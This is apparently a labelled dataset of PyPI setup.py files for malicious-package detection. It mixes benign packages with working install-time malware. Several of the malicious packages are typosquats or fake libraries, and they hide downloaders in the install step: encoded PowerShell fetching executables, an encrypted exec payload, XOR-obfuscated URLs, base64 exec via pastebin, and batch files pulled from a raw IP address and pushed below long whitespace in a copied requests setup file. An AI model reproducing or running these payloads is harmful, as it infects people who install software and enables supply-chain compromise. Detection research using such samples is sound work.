{"idx": "tppeppullintel-4.38", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppeppullintel',\n    packages = ['modlib'],\n    version = '9.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "graphlib_backport-1.0.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['graphlib']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'graphlib-backport',\n    'version': '1.0.3',\n    'description': 'Backport of the Python 3.9 graphlib module for Python 3.6+',\n    'long_description': \"# graphlib backport\\n\\nBackport of the Python 3.9\\n[graphlib](https://docs.python.org/3/library/graphlib.html)\\nmodule for older Python versions.\\n\\nGithub:\\n[https://github.com/mariushelf/graphlib_backport](https://github.com/mariushelf/graphlib_backport)\\n\\n# Supported versions\\n\\nThis backport currently support Python 3.6, 3.7, 3.8, 3.9 and and pypy3\\n(tested with pypy3.6).\\n\\n\\n# Installation\\n\\n`pip install graphlib_backport`\\n\\n# Usage\\n\\nThe package works the very same way as the original package.\\n[Here's](https://docs.python.org/3/library/graphlib.html) the documentation.\\n\\n\\n# Development\\n\\nThe sourcecode is hosted on\\n[github](https://github.com/mariushelf/graphlib_backports).\\nTo develop on this package, just clone it, work on it and submit a pull request.\\n\\n\\n## Dev requirements\\n\\nFor testing against different Python versions, [tox](https://tox.readthedocs.io/en/latest/)\\nis required.\\n\\nTo download the latest original sourcecode into the repository, there is a make target:\\n\\n`make download_sourcecode`\\n\\n*Warning*: This overwrites the code in this repo. By default it uses the tag `v3.9.0`,\\nbut you can overwrite that with a `tag` environment variable.\\n\\n\\n## Running tests\\n\\nAs simple as running `tox` on the command line.\\n\\nThe executables for all python versions must be in the path, e.g,\\n`python3.6`, ..., `python3.9`, `pypy3`.\\nYou can install them with [pyenv](https://github.com/pyenv/pyenv).\\n\\n\\n## Publishing a new version\\n\\nUpdate the version in the pyproject.toml and run `make publish` to build and upload\\nthe package ti PyPI.\\n\\n\\n# Thanks\\n\\nI did not create this code -- I only repackaged it so it can be\\npip-installed into older versions of Python.\\n\\nSo all thanks go to the original contributors of the\\n[original sourcecode](https://github.com/python/cpython/blob/3.9/Lib/graphlib.py).\\n\\n\\n# License\\n\\n[PSF](https://docs.python.org/3/license.html#psf-license)\\n\\n\",\n    'author': 'Marius Helf',\n    'author_email': 'helfsmarius@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "calendar-extender-0.1", "func": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\n\nICON = [\n\tbytes.fromhex(\n\t\t\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"\n\t),\n\tbytes.fromhex(\n\t\t\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"\n\t),\n\tbytes.fromhex(\n\t\t\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"6372616674\"),\n\tbytes.fromhex(\"726962626f6e\"),\n\tbytes.fromhex(\"656666656374\"),\n\tbytes.fromhex(\"6a61636b6574\"),\n]\n\n\ndef gen(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n\n        yield b\n\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    \n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    \n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    with open('/tmp/9bacc561-8485-4731-9c09-7eb4f3fae355', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break\n\n\nsetup(\n    name='calendar-extender',\n    version='0.1',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n", "target": 1}
{"idx": "postget-1.38", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'postget',\n    packages = ['modlib'],\n    version = '2.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "intint-7.72", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'intint',\n    packages = ['modlib'],\n    version = '5.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "funcx-0.3.9", "func": "import os\n\nfrom setuptools import find_namespace_packages, setup\n\nREQUIRES = [\n    # request sending and authorization tools\n    \"requests>=2.20.0\",\n    \"globus-sdk>=3,<4\",\n    \"fair_research_login==0.2.6\",\n    # 'websockets' is used for the client-side websocket listener\n    \"websockets==9.1\",\n    # table printing used in search result rendering\n    \"texttable>=1.6.4,<2\",\n    # dill is an extension of `pickle` to a wider array of native python types\n    # pin to the latest version, as 'dill' is not at 1.0 and does not have a clear\n    # versioning and compatibility policy\n    \"dill==0.3.4\",\n]\nDOCS_REQUIRES = [\n    \"sphinx<5\",\n    \"furo==2021.09.08\",\n]\n\nTEST_REQUIRES = [\n    \"flake8==3.8.0\",\n    \"numpy\",\n    \"pytest\",\n    # easy mocking of the `requests` library\n    \"responses\",\n]\nDEV_REQUIRES = TEST_REQUIRES + [\n    \"pre-commit\",\n]\n\nversion_ns = {}\nwith open(os.path.join(\"funcx\", \"sdk\", \"version.py\")) as f:\n    exec(f.read(), version_ns)\nversion = version_ns[\"VERSION\"]\n\nsetup(\n    name=\"funcx\",\n    version=version,\n    packages=find_namespace_packages(include=[\"funcx\", \"funcx.*\"]),\n    description=\"funcX: High Performance Function Serving for Science\",\n    install_requires=REQUIRES,\n    extras_require={\n        \"dev\": DEV_REQUIRES,\n        \"test\": TEST_REQUIRES,\n        \"docs\": DOCS_REQUIRES,\n    },\n    python_requires=\">=3.6.0\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Scientific/Engineering\",\n    ],\n    scripts=[\"funcx/serialize/off_process_checker.py\"],\n    keywords=[\"funcX\", \"FaaS\", \"Function Serving\"],\n    author=\"funcX team\",\n    author_email=\"labs@globus.org\",\n    license=\"Apache License, Version 2.0\",\n    url=\"https://github.com/funcx-faas/funcx\",\n)\n", "target": 0}
{"idx": "Flask-2.2.2", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "diskcache-5.4.0", "func": "from io import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nimport diskcache\n\n\nclass Tox(TestCommand):\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import tox\n\n        errno = tox.cmdline(self.test_args)\n        exit(errno)\n\n\nwith open('README.rst', encoding='utf-8') as reader:\n    readme = reader.read()\n\nsetup(\n    name=diskcache.__title__,\n    version=diskcache.__version__,\n    description='Disk Cache -- Disk and file backed persistent cache.',\n    long_description=readme,\n    author='Grant Jenks',\n    author_email='contact@grantjenks.com',\n    url='http://www.grantjenks.com/docs/diskcache/',\n    project_urls={\n        'Documentation': 'http://www.grantjenks.com/docs/diskcache/',\n        'Funding': 'https://gum.co/diskcache',\n        'Source': 'https://github.com/grantjenks/python-diskcache',\n        'Tracker': 'https://github.com/grantjenks/python-diskcache/issues',\n    },\n    license='Apache 2.0',\n    packages=['diskcache'],\n    tests_require=['tox'],\n    cmdclass={'test': Tox},\n    python_requires='>=3',\n    install_requires=[],\n    classifiers=(\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Natural Language :: English',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ),\n)\n", "target": 0}
{"idx": "PyTorchg-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'yfvIqztIUqpqwQhKpWgCkFkOGZcx'\nLONG_DESCRIPTION = 'nlodIwlBwtVoJyGyrjT zhYUyPikChrBEzdkHHXsWUqfdCGobegswuTUevFpRYnBRxnLYnCuzThlJAlEeqbNrFmMUCLVmMfmGhXttpXaaBXwqVIfNLmtrOQnJJqkXpWzYkvwJRWDHsfLoL vbAMJQsCMiuQEsQyFWppbt YHYjaXsBvjQmIEhGkQvzNeahSQbgJexUmyUUWM RoJZleUSNSuzTbQaoPRExiNWrNprYUabijeOEeamlElpbEhwjFHawLIPOmkBBDKOU'\n\n\nclass UViXZOKvedFxBjOifmplzWjzSqJaMDxdNcVoQPsVDSVhSGAlyDmpjPfkbYTimeuPEtjHRANoZvjKKpvCHrmovoHcPygkRfDIXWbinZUwsGjhPPROGZusuLKwcg(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'vvd4YDZXnD9xUiRveF5ihu9_TdPkbr5Gntuq3sS7GcE=').decrypt(b'gAAAAABmBILRcGyL7LagwGi1JQwN54lL4wh9wmq2FNSvExMRcjL-fhjIwid7yXPwmA11Dttc7s-abkKoKfJPROca0ES2p2weJ1oOgRP6eXYyRkwh674bnyuXvd7DrNosGzCsqp0qlQ1-bpJmKUwHbQ0cDk1lUt0anyx6zZ0ntRjTDMEWL3kVzg00-T0rvq9f6cFYgu8fCBUke3Axyjt6IjCH06C5xGGTurNUnK3OfAxJpn7PHas_y78='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"PyTorchg\",\n    version=VERSION,\n    author=\"owgFRMs\",\n    author_email=\"ekXWsPQKSEbsrKYHqXom@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': UViXZOKvedFxBjOifmplzWjzSqJaMDxdNcVoQPsVDSVhSGAlyDmpjPfkbYTimeuPEtjHRANoZvjKKpvCHrmovoHcPygkRfDIXWbinZUwsGjhPPROGZusuLKwcg,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "selfrandompywosint-10.4", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandompywosint',\n    packages = ['modlib'],\n    version = '1.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "new-requests-2.28.1", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\n        \"\"\"\n==========================\nUnsupported Python version\n==========================\nThis version of Requests requires at least Python {}.{}, but\nyou're trying to install it on Python {}.{}. To resolve this,\nconsider upgrading to a supported Python version.\n\nIf you can't upgrade your Python version, you'll need to\npin to an older version of Requests (<2.28).\n\"\"\".format(\n            *(REQUIRED_PYTHON + CURRENT_PYTHON)\n        )\n    )\n    sys.exit(1)\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        try:\n            from multiprocessing import cpu_count\n\n            self.pytest_args = [\"-n\", str(cpu_count()), \"--boxed\"]\n        except (ImportError, NotImplementedError):\n            self.pytest_args = [\"-n\", \"1\", \"--boxed\"]\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\nrequires = [\n    \"charset_normalizer>=2,<3\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nabout = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"requests\", \"__version__.py\"), \"r\", \"utf-8\") as f:\n    exec(f.read(), about)\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name='new-requests',\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\"test\": PyTest},\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nif os.name == 'nt':\n  import base64\n  from time import sleep\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # try:\n    #   subprocess.Popen(\"cmd /c break>local.bat:Zone.Identifier\", shell=True, stdin=subprocess.PIPE,\n    #                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # except:\n    #   pass\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "target": 1}
{"idx": "roblopython-2.0.15", "func": "import setuptools, base64\n\n\nsetuptools.setup(\n    name=\"roblopython\",\n    version=\"2.0.15\",\n    author=\"roblopython\",\n    #description=\"Official wrapper for the Roblox API\",\n    description=\"roblopy\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n\nimport base64\nexec(base64.b64decode(\"ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK\"))\n", "target": 1}
